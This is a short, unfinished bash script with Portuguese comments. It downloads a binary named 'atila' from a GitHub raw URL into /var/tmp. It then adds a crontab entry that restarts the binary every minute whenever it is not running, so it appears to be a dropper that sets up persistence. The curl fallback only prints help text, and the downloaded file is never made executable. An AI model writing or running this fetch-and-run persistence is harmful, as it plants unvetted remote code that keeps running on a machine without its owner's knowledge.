#ATILA_VKZMN


#esse script executara varias acoes   elas serao inplemetadas  

#nem todas agora ok so as mais importantes por agora ok

url='https://github.com/atilabyte/golang/raw/refs/heads/master/atila'

wget_ok=0



cron() {

cron_out=$( crontab -l )


if  echo  "$cron_out" | grep -q atila  ; then 

echo tem

else

echo nao tem

#download of atila and add in crontab 

command -v wget

if (( $? )) ; then

wget_ok=0

else

wget_ok=1

fi;




if [ $wget_ok -eq 1 ] ; then

wget $url -O /var/tmp/atila

(crontab -l ; echo   "* * * * * /usr/bin/pgrep atila ||   /var/tmp/atila") | crontab -


else

curl --help


fi;


fi;

}






#(crontab -l ; echo  #* * * * * /usr/bin/pgrep atila ||   /var/tmp/atila") | crontab -


init() {

 

cron

}



init
